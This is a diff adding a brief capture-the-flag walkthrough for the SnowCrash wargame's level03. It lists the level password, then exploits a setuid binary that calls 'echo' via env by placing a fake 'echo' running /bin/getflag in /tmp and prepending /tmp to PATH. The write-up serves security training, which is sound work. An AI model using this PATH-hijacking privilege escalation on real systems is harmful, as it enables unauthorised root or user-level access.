@@ -1,0 +1,19 @@
+su level03
+Password: kooda2puivaav1idi4f57q8iq
+
+ls -la 
+-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
+
+./level03 -> "Exploit me"
+level03@SnowCrash:~$ strings level03 | grep "Exploit me"
+/usr/bin/env echo Exploit me
+
+
+level03@SnowCrash:~$ cd /tmp
+level03@SnowCrash:/tmp$ echo '/bin/getflag' > echo
+level03@SnowCrash:/tmp$ chmod 777 echo
+cd -
+export PATH=/tmp:$PATH
+
+./level03
+
